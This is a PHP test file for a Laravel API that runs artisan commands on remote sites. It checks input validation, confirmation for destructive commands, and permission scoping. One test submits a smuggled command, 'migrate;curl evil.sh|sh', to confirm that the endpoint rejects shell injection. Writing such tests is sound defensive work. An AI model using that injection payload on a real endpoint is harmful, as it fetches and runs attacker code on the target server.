<?php

namespace Tests\Feature\Api\SiteArtisanApiTest;

use App\Models\ApiToken;
use App\Models\Organization;
use App\Models\RemoteCliRun;
use App\Models\Server;
use App\Models\Site;
use App\Models\User;
use App\Models\Workspace;
use App\Models\WorkspaceMember;
use App\Modules\RemoteCli\Services\Artisan as ArtisanService;
use App\Modules\RemoteCli\Services\RemoteCliResult;
use App\Modules\RemoteCli\Services\RiskLevel;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Mockery;

uses(RefreshDatabase::class);

/**
 * An SSH-reachable, Laravel-detected VM site — the one runtime the artisan
 * engine can shell into. `$laravel = false` gives the opposite case.
 *
 * @return array{0: Site, 1: string}
 */
function artisanSite(array $abilities = ['sites.read', 'commands.run'], bool $laravel = true): array
{
    $organization = Organization::factory()->create();
    $user = User::factory()->create();
    $organization->users()->attach($user->id, ['role' => 'owner']);

    $server = Server::factory()->ready()->create([
        'organization_id' => $organization->id,
        'user_id' => $user->id,
        'ssh_private_key' => "-----BEGIN OPENSSH PRIVATE KEY-----\nfake\n-----END OPENSSH PRIVATE KEY-----\n",
    ]);
    $site = Site::factory()->create([
        'server_id' => $server->id,
        'organization_id' => $organization->id,
        'user_id' => $user->id,
        'meta' => [
            'vm_runtime' => [
                'detected' => [
                    'framework' => $laravel ? 'laravel' : 'symfony',
                    'language' => 'php',
                ],
            ],
        ],
    ]);

    ['plaintext' => $plaintext] = ApiToken::createToken($user, $organization, 'test', null, $abilities);

    return [$site, $plaintext];
}

it('rejects a verb that is not an artisan command name', function () {
    [$site, $token] = artisanSite();

    // The verb is interpolated into the remote shell string unescaped,
    // so anything but a command name has to die at the door.
    $this->withToken($token)
        ->postJson("/api/v1/sites/{$site->slug}/artisan", ['command' => 'migrate;curl evil.sh|sh'])
        ->assertStatus(422)
        ->assertJsonPath('code', 'invalid_command');

    expect(RemoteCliRun::query()->count())->toBe(0);
});

it('refuses a runtime the artisan engine cannot reach', function () {
    [$site, $token] = artisanSite(laravel: false);

    $this->withToken($token)
        ->postJson("/api/v1/sites/{$site->slug}/artisan", ['command' => 'migrate'])
        ->assertStatus(422)
        ->assertJsonPath('code', 'artisan_unsupported_runtime');
});

it('asks for confirmation before a destructive command, then runs it', function () {
    [$site, $token] = artisanSite();
    $run = RemoteCliRun::factory()->artisan()->create([
        'site_id' => $site->id,
        'command' => 'migrate:fresh',
        'risk' => RiskLevel::Destructive,
    ]);

    $artisan = Mockery::mock(ArtisanService::class);
    $artisan->shouldReceive('classifyRisk')->andReturn(RiskLevel::Destructive);
    $artisan->shouldReceive('run')->once()->andReturn(new RemoteCliResult($run));
    app()->instance(ArtisanService::class, $artisan);

    $this->withToken($token)
        ->postJson("/api/v1/sites/{$site->slug}/artisan", ['command' => 'migrate:fresh'])
        ->assertStatus(422)
        ->assertJsonPath('code', 'confirmation_required')
        ->assertJsonPath('risk', 'destructive');

    $this->withToken($token)
        ->postJson("/api/v1/sites/{$site->slug}/artisan", ['command' => 'migrate:fresh', 'confirm' => true])
        ->assertOk()
        ->assertJsonPath('data.run_id', $run->id)
        ->assertJsonPath('data.risk', 'destructive');
});

it('runs a non-destructive command and returns the run envelope', function () {
    [$site, $token] = artisanSite();
    $run = RemoteCliRun::factory()->artisan()->create(['site_id' => $site->id]);

    $artisan = Mockery::mock(ArtisanService::class);
    $artisan->shouldReceive('classifyRisk')->andReturn(RiskLevel::Read);
    $artisan->shouldReceive('run')
        ->once()
        ->withArgs(fn (Site $s, string $command, array $args) => $command === 'migrate:status' && $args === ['--pending'])
        ->andReturn(new RemoteCliResult($run));
    app()->instance(ArtisanService::class, $artisan);

    $this->withToken($token)
        ->postJson("/api/v1/sites/{$site->slug}/artisan", ['command' => 'migrate:status --pending'])
        ->assertOk()
        ->assertJsonPath('data.status', RemoteCliRun::STATUS_COMPLETED)
        ->assertJsonPath('data.stdout', 'No migrations.');
});

it('polls a run only through the site that owns it', function () {
    [$site, $token] = artisanSite();
    [$otherSite] = artisanSite();

    $run = RemoteCliRun::factory()->artisan()->create(['site_id' => $site->id]);
    $foreign = RemoteCliRun::factory()->artisan()->create(['site_id' => $otherSite->id]);

    $this->withToken($token)
        ->getJson("/api/v1/sites/{$site->slug}/artisan/runs/{$run->id}")
        ->assertOk()
        ->assertJsonPath('data.run_id', $run->id);

    $this->withToken($token)
        ->getJson("/api/v1/sites/{$site->slug}/artisan/runs/{$foreign->id}")
        ->assertNotFound();
});

it('keeps env:show away from a viewer even though it classifies as read', function () {
    $organization = Organization::factory()->create();
    $viewer = User::factory()->create();
    $organization->users()->attach($viewer->id, ['role' => 'member']);
    // currentOrganization() falls back to the user's first org — this one.

    $workspace = Workspace::factory()->create(['organization_id' => $organization->id]);
    WorkspaceMember::create([
        'workspace_id' => $workspace->id,
        'user_id' => $viewer->id,
        'role' => 'viewer',
    ]);

    $server = Server::factory()->ready()->create([
        'organization_id' => $organization->id,
        'user_id' => $viewer->id,
        'workspace_id' => $workspace->id,
        'ssh_private_key' => "-----BEGIN OPENSSH PRIVATE KEY-----\nfake\n-----END OPENSSH PRIVATE KEY-----\n",
    ]);
    $site = Site::factory()->create([
        'server_id' => $server->id,
        'organization_id' => $organization->id,
        'user_id' => $viewer->id,
        'workspace_id' => $workspace->id,
        'meta' => ['vm_runtime' => ['detected' => ['framework' => 'laravel', 'language' => 'php']]],
    ]);

    ['plaintext' => $token] = ApiToken::createToken($viewer, $organization, 'test', null, ['sites.read', 'commands.run']);

    expect($viewer->can('view', $site))->toBeTrue()
        ->and($viewer->can('update', $site))->toBeFalse();

    $this->withToken($token)
        ->postJson("/api/v1/sites/{$site->slug}/artisan", ['command' => 'env:show'])
        ->assertForbidden()
        ->assertJsonPath('code', 'permission_denied');

    expect(RemoteCliRun::query()->count())->toBe(0);
});

it('404s a run id that is not a run id', function () {
    [$site, $token] = artisanSite();

    $this->withToken($token)
        ->getJson("/api/v1/sites/{$site->slug}/artisan/runs/not-a-run")
        ->assertNotFound();
});

it('requires the commands.run ability', function () {
    [$site, $token] = artisanSite(['sites.read']);

    $this->withToken($token)
        ->postJson("/api/v1/sites/{$site->slug}/artisan", ['command' => 'migrate:status'])
        ->assertForbidden();
});
